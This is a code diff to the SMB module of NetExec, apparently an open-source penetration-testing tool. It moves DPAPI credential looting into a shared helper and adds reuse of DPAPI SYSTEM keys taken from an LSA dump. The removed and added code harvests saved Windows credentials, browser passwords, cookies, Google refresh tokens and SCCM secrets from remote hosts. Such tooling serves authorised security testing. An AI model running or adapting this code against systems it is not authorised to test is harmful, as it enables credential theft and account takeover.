@@ -58,8 +58,6 @@ from nxc.config import process_secret, host_info_colors, check_guest_account
 from nxc.connection import connection, sem, requires_admin, dcom_FirewallChecker
 from nxc.helpers.misc import gen_random_string, validate_ntlm
 from nxc.logger import NXCAdapter
-from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection
-from nxc.protocols.smb.firefox import FirefoxCookie, FirefoxData, FirefoxTriage
 from nxc.protocols.smb.kerberos import kerberos_login_with_S4U, kerberos_altservice, get_realm_from_ticket
 from nxc.protocols.smb.wmiexec import WMIEXEC
 from nxc.protocols.smb.atexec import TSCH_EXEC
@@ -72,17 +70,13 @@ from nxc.protocols.smb.samrfunc import SamrFunc
 from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
 from nxc.helpers.logger import highlight
 from nxc.helpers.bloodhound import add_user_bh
+from nxc.helpers.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection, DPAPITriage
 from nxc.helpers.rpc import NXCRPCConnection
 from nxc.helpers.powershell import create_ps_command
 from nxc.helpers.misc import detect_if_ip
 from nxc.protocols.ldap.resolution import LDAPResolution
 
-from dploot.triage.vaults import VaultsTriage
-from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken, Cookie
-from dploot.triage.credentials import CredentialsTriage
-from dploot.triage.cng import CngTriage
-from dploot.lib.target import Target
-from dploot.triage.sccm import SCCMTriage, SCCMCred, SCCMSecret, SCCMCollection
+from dploot.lib.network.smb import SMBTarget as Target
 
 from time import time, ctime, sleep
 from traceback import format_exc
@@ -135,6 +129,7 @@ class smb(connection):
         self.nthash = ""
         self.remote_ops = None
         self.bootkey = None
+        self.dpapi_system_key = None
         self.smbv1 = None   # Check if SMBv1 is supported
         self.smbv3 = None   # Check if SMBv3 is supported
         self.is_timed_out = False
@@ -2160,7 +2155,7 @@ class smb(connection):
             domain=self.domain,
             username=self.username,
             password=self.password,
-            target=self.hostname + "." + self.domain if self.kerberos else self.host,
+            address=self.hostname + "." + self.domain if self.kerberos else self.host,
             lmhash=self.lmhash,
             nthash=self.nthash,
             do_kerberos=self.kerberos,
@@ -2169,12 +2164,17 @@ class smb(connection):
             use_kcache=self.use_kcache,
         )
 
-        conn = upgrade_to_dploot_connection(connection=self.conn, target=target)
+        conn = upgrade_to_dploot_connection(context=self, target=target, protocol="smb")
         if conn is None:
             self.logger.debug("Could not upgrade connection")
             return
 
-        masterkeys = collect_masterkeys_from_target(self, target, conn, user=False)
+        if self.dpapi_system_key is None:
+            # Need to get DPAPI SYSTEM keys, prefer to use embedded LSA dump
+            # if not already dumped
+            self.lsa()
+
+        masterkeys = collect_masterkeys_from_target(self, target, conn, user=False, dpapi_system_key=self.dpapi_system_key)
 
         if len(masterkeys) == 0:
             self.logger.fail("No masterkeys looted")
@@ -2182,49 +2182,13 @@ class smb(connection):
 
         self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting SCCM Credentials through {self.args.sccm}")
 
-        def sccm_callback(secret):
-            if isinstance(secret, SCCMCred):
-                tag = "NAA Account"
-                self.logger.highlight(f"[{tag}] {secret.username.decode('latin-1')}:{secret.password.decode('latin-1')}")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    f"SCCM - {tag}",
-                    "SYSTEM",
-                    secret.username.decode("latin-1"),
-                    secret.password.decode("latin-1"),
-                    "N/A",
-                )
-            elif isinstance(secret, SCCMSecret):
-                tag = "Task sequences secret"
-                self.logger.highlight(f"[{tag}] {secret.secret.decode('latin-1')}")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    f"SCCM - {tag}",
-                    "SYSTEM",
-                    "N/A",
-                    secret.secret.decode("latin-1"),
-                    "N/A",
-                )
-            elif isinstance(secret, SCCMCollection):
-                tag = "Collection Variable"
-                self.logger.highlight(f"[{tag}] {secret.variable.decode('latin-1')}:{secret.value.decode('latin-1')}")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    f"SCCM - {tag}",
-                    "SYSTEM",
-                    secret.variable.decode("latin-1"),
-                    secret.value.decode("latin-1"),
-                    "N/A",
-                )
-        try:
-            sccm_triage = SCCMTriage(target=target, conn=conn, masterkeys=masterkeys, per_secret_callback=sccm_callback)
-            sccm_triage.triage_sccm(use_wmi=self.args.sccm == "wmi", )
-        except Exception as e:
-            self.logger.debug(f"Error while looting sccm: {e}")
+        dpapi_triage = DPAPITriage(self, target, conn)
+        dpapi_triage.triage_sccm(masterkeys)
 
     @requires_admin
     def dpapi(self):
         dump_system = "nosystem" not in self.args.dpapi
+        self.output_file = open(self.output_file_template.format(output_folder="dpapi"), "w", encoding="utf-8")  # noqa: SIM115
 
         if self.args.pvk is not None:
             try:
@@ -2240,7 +2204,7 @@ class smb(connection):
             domain=self.domain,
             username=self.username,
             password=self.password,
-            target=self.remoteName,
+            address=self.remoteName,
             lmhash=self.lmhash,
             nthash=self.nthash,
             do_kerberos=self.kerberos,
@@ -2249,14 +2213,17 @@ class smb(connection):
             use_kcache=self.use_kcache,
         )
 
-        self.output_file = open(self.output_file_template.format(output_folder="dpapi"), "w", encoding="utf-8")  # noqa: SIM115
-
-        conn = upgrade_to_dploot_connection(connection=self.conn, target=target)
+        conn = upgrade_to_dploot_connection(context=self, target=target, protocol="smb")
         if conn is None:
             self.logger.debug("Could not upgrade connection")
             return
 
-        masterkeys = collect_masterkeys_from_target(self, target, conn, system=dump_system)
+        if dump_system and self.dpapi_system_key is None:
+            # Need to get DPAPI SYSTEM keys, prefer to use embedded LSA dump
+            # if not already dumped
+            self.lsa()
+
+        masterkeys = collect_masterkeys_from_target(self, target, conn, dpapi_system_key=self.dpapi_system_key)
 
         if len(masterkeys) == 0:
             self.logger.fail("No masterkeys looted")
@@ -2264,136 +2231,8 @@ class smb(connection):
 
         self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")
 
-        # Collect User and Machine Credentials Manager secrets
-        def credential_callback(credential):
-            tag = "CREDENTIAL"
-            line = f"[{credential.winuser}][{tag}] {credential.target} - {credential.username}:{credential.password}"
-            self.logger.highlight(line)
-            if self.output_file:
-                self.output_file.write(line + "\n")
-            self.db.add_dpapi_secrets(
-                target.address,
-                tag,
-                credential.winuser,
-                credential.username,
-                credential.password,
-                credential.target,
-            )
-
-        try:
-            credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys, per_credential_callback=credential_callback)
-            self.logger.debug(f"Credentials Triage Object: {credentials_triage}")
-            credentials_triage.triage_credentials()
-            if dump_system:
-                credentials_triage.triage_system_credentials()
-        except Exception as e:
-            self.logger.debug(f"Error while looting credentials: {e}")
-
-        dump_cookies = "cookies" in self.args.dpapi
-
-        cng_chromekey = None
-        try:
-            cng_triage = CngTriage(target=target, conn=conn, masterkeys=masterkeys)
-            for cng_file in cng_triage.triage_system_cng():
-                if cng_file.cng_blob["Name"].decode("utf-16le").rstrip("\0") == "Google Chromekey1":
-                    self.logger.debug("Found CNG Google ChromeKey1\n")
-                    cng_chromekey = cng_file.decrypted_private_key
-        except Exception as e:
-            self.logger.debug(f"Error while getting CNG ChromeKey1: {e}")
-
-        # Collect Chrome Based Browser stored secrets
-        def browser_callback(secret):
-            if isinstance(secret, LoginData):
-                secret_url = secret.url + " -" if secret.url != "" else "-"
-                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret_url} {secret.username}:{secret.password}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    secret.browser.upper(),
-                    secret.winuser,
-                    secret.username,
-                    secret.password,
-                    secret.url,
-                )
-            elif isinstance(secret, GoogleRefreshToken):
-                line = f"[{secret.winuser}][{secret.browser.upper()}] Google Refresh Token: {secret.service}:{secret.token}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    secret.browser.upper(),
-                    secret.winuser,
-                    secret.service,
-                    secret.token,
-                    "Google Refresh Token",
-                )
-            elif isinstance(secret, Cookie):
-                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret.host}{secret.path} - {secret.cookie_name}:{secret.cookie_value}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-
-        try:
-            browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys, per_secret_callback=browser_callback)
-            browser_triage.triage_browsers(gather_cookies=dump_cookies, cng_chromekey=cng_chromekey)
-        except Exception as e:
-            self.logger.debug(f"Error while looting browsers: {e}")
-
-        def vault_callback(secret):
-            tag = "IEX"
-            if secret.type == "Internet Explorer":
-                resource = secret.resource + " -" if secret.resource != "" else "-"
-                line = f"[{secret.winuser}][{tag}] {resource} - {secret.username}:{secret.password}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    tag,
-                    secret.winuser,
-                    secret.username,
-                    secret.password,
-                    secret.resource,
-                )
-
-        try:
-            # Collect User Internet Explorer stored secrets
-            vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys, per_vault_callback=vault_callback)
-            vaults_triage.triage_vaults()
-        except Exception as e:
-            self.logger.debug(f"Error while looting vaults: {e}")
-
-        def firefox_callback(secret):
-            tag = "FIREFOX"
-            if isinstance(secret, FirefoxData):
-                url = secret.url + " -" if secret.url != "" else "-"
-                line = f"[{secret.winuser}][{tag}] {url} {secret.username}:{secret.password}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    tag,
-                    secret.winuser,
-                    secret.username,
-                    secret.password,
-                    secret.url,
-                )
-            elif isinstance(secret, FirefoxCookie):
-                line = f"[{secret.winuser}][{tag}] {secret.host}{secret.path} {secret.cookie_name}:{secret.cookie_value}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-
-        try:
-            # Collect Firefox stored secrets
-            firefox_triage = FirefoxTriage(target=target, logger=self.logger, conn=conn, per_secret_callback=firefox_callback)
-            firefox_triage.run(gather_cookies=dump_cookies)
-        except Exception as e:
-            self.logger.debug(f"Error while looting firefox: {e}")
+        dpapi_triage = DPAPITriage(self, target, conn, dump_cookies="cookies" in self.args.dpapi)
+        dpapi_triage.triage(masterkeys)
 
         if self.output_file:
             self.output_file.close()
@@ -2433,6 +2272,9 @@ class smb(connection):
                     ntlm_hash.update(currentPassword)
                     passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
                     self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
+                if "dpapi_machinekey" in secret:
+                    correl_table = {"dpapi_machinekey":"MachineKey","dpapi_userkey":"UserKey"}
+                    self.dpapi_system_key = {correl_table[k] :binascii.unhexlify(v[2:]) for k, v in (elem.split(":") for elem in secret.splitlines())}
 
             add_lsa_secret.secrets = 0
 
